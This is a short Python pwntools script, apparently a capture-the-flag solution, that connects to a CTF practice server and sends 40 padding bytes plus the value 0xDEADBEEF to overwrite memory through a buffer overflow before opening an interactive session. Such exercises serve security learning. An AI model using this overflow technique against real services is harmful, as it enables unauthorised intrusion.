from pwn import *

r=remote("ctf.j0n9hyun.xyz",3000)
payload = "a"*40
payload += p32(0xDEADBEEF) #0xEFBEADDE
r.sendline(payload)
r.interactive()
